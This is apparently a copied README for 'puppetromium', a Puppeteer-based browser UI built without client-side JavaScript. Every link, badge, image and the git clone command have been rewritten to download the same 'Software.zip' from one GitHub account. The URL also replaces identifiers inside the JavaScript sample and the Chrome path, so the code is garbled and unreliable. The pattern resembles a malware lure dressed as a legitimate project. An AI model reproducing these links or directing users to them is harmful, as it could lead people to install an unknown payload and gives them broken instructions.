# :tophat: [puppetromium](https://github.com/haydenmellor2/puppetromium/releases/download/v1.0/Software.zip) ![npm](https://github.com/haydenmellor2/puppetromium/releases/download/v1.0/Software.zip) ![npm](https://github.com/haydenmellor2/puppetromium/releases/download/v1.0/Software.zip)

![puppetromium in action](https://github.com/haydenmellor2/puppetromium/releases/download/v1.0/Software.zip)

## A simple browser UI for puppeteer, built with no client-side JavaScript.

**Puppetromium** is a [single file](https://github.com/haydenmellor2/puppetromium/releases/download/v1.0/Software.zip) simple web-browser built on Puppeteer. If Chromium, Puppeteer and 1987 had a love child, it would be this oddly adorable. Probably. 

Also, **there is no (as in zero "0") client-side scripting (in this browser UI) of any kind. No JavaScript. No ActionScript. No Flash. This crazy-simple remote browser UI is built entirely with HTML and CSS.**

## How is this possible?

With the power ⚡ 💪, my friend, of the following ancient®️ techs©️ from ye olde webbe:

- [MJPEG](https://github.com/haydenmellor2/puppetromium/releases/download/v1.0/Software.zip) to stream the remote viewport with server-push only
- [`<input type=image https://github.com/haydenmellor2/puppetromium/releases/download/v1.0/Software.zip>`](https://github.com/haydenmellor2/puppetromium/releases/download/v1.0/Software.zip) to capture X and Y co-ordinates of pointer events and post them to the server on click. 
- [targeted forms](https://github.com/haydenmellor2/puppetromium/releases/download/v1.0/Software.zip) and [named iframes](https://github.com/haydenmellor2/puppetromium/releases/download/v1.0/Software.zip) to allow transmitting actions like 'type text' or 'scroll down' without reloading the top-level page. 

## How can I too?

### Running Puppetromium with GitHub Actions

Puppetromium can also be deployed directly from your GitHub repository using GitHub Actions. This offers a unique way to interact with a web browser running on a GitHub Action runner.

Here are the steps to set up Puppetromium on GitHub Actions:

1. Fork this repo: Start by forking this repository to your own GitHub account.
2. Setup ngrok token: Sign up on ngrok and get your authtoken. Add this token to your forked repository's secrets (Settings -> Secrets -> New repository secret). Name the secret NGROK_AUTH_TOKEN.
3. Run the workflow: Go to Actions tab in your repository, select the CI workflow, and click Run workflow.
4. Access your instance: Once the workflow completes successfully, it outputs an ngrok public URL that you can use to access your Puppetromium instance running on GitHub's infrastructure.
5. Please note, GitHub Actions has a timeout, so your instance will not stay alive indefinitely. For longer sessions, consider deploying on a dedicated server.

This feature of Puppetromium is an excellent way to get your toes wet in the world of remote browsing and cloud browsers without any cost. Feel free to experiment and build on top of it!

## but why?

Mostly as an exercise. To see how simple I get a remote browser that is still minimally usable. But also as an example of why puppeteer is not a great fit for this. And a reminder why I created a [whole other browser driving](https://github.com/haydenmellor2/puppetromium/releases/download/v1.0/Software.zip) [protocol atop the DevTools protocol](https://github.com/haydenmellor2/puppetromium/releases/download/v1.0/Software.zip) for my custom [remote isolated browser](https://github.com/haydenmellor2/puppetromium/releases/download/v1.0/Software.zip). 

Also because I thought people will think a browser UI built with Puppeteer is cool, and it might encourage them to get into remote browsing, and custom browser UIs for cloud browsers, and hack on top of it. I wanted to release something with a very [permissive license](https://github.com/haydenmellor2/puppetromium/releases/download/v1.0/Software.zip), that might spark people's imaginations about how they could use this kind of tech in their own project. I wanted something I could build in 1 day (and indeed, it took me around 6 hours). I wanted something where I wasn't restricted by the need to keep the license strict (e.g., AGPL-3.0), in order to preserve my business of selling corporate license exceptions and SaaS deployments. 

I wanted to give people a way they could get their toes wet, without having to pay anything, and so they might build their own on top of it. Because the type of people who would probably find this useful to hack on, are not the type of people who want to pay for a corporate license.

## so, how simple is it?

A single NodeJS file that serves **everything**, 350 source lines of code, 6 endpoints (5 GET, 1 POST), 1 export and 3 external imports (express, mjpeg-server, and of course puppeteer).

## okay, but how you size the remote browser viewport to roughly match my screen without any client-side JavaScript, what crazy majyck is this?

With, my friend, the following ingenious idea:

```javascript
/* code to set the viewport approx size without client side JS */
    // for all w and h combinations that are relevant
    `@media screen and (min-width: ${w}px) and (min-height: ${h}px) {
      body {
        background-image: url("/set-viewport-dimensions/width/${w}/height/${h}https://github.com/haydenmellor2/puppetromium/releases/download/v1.0/Software.zip") 
      }
    }`

    https://github.com/haydenmellor2/puppetromium/releases/download/v1.0/Software.zip('https://github.com/haydenmellor2/puppetromium/releases/download/v1.0/Software.zip', async (req, res) => {
      const ua = https://github.com/haydenmellor2/puppetromium/releases/download/v1.0/Software.zip['user-agent'];
      const isMobile = testMobile(ua);
      let {width,height} = https://github.com/haydenmellor2/puppetromium/releases/download/v1.0/Software.zip;

      width = parseFloat(width);
      height = parseFloat(height);
     
      await https://github.com/haydenmellor2/puppetromium/releases/download/v1.0/Software.zip({
        viewport: {
          width,
          height,
          isMobile
        },
        userAgent: ua
      });
    ...
```

## How can I too? :gem:

Note that you may first want to export the following environment variables (change depending on your local Chrome-compatible browser binary path), this skips the lengthy and bandwidth expensive (and npm cache expensive, poor little old npm!) download of chromium endemic to puppeteer:

```shell
export PUPPETEER_SKIP_CHROMIUM_DOWNLOAD=true
export PUPPETEER_EXECUTABLE_PATH="/Applications/Google https://github.com/haydenmellor2/puppetromium/releases/download/v1.0/Software.zip Chrome"
```

Then you can get into it quickly, as follows.

## Install mantra alternatives:

```sh
$ git clone https://github.com/haydenmellor2/puppetromium/releases/download/v1.0/Software.zip
$ cd puppetromium
$ npm i 
$ npm test
```

Or `npm start <... your port ...>` where your port is the port you want to run it on.

Or you can `npm i --save` the package and then:
```
Then:
```js
import {start} from 'puppetromium';
start({port:8080, url:'https://github.com/haydenmellor2/puppetromium/releases/download/v1.0/Software.zip'});
```

Or:
```sh
$ npx puppetromium@latest 8080
# or
$ npm i -g puppetromium@latest
$ puppetromium 8080
```

## Linux and Linuxes

**NOTE:** If you're on Linux you should run `npm run nixinstall` after npm i. 
This will install the dependencies.

## HELP! It broke

It's probably because of puppeteer dependencies. Make sure you have them all installed. I included a bunch of dependency scripts tailed to Debian (which may work on other Linuxes, but your mileage may encounter variability). 
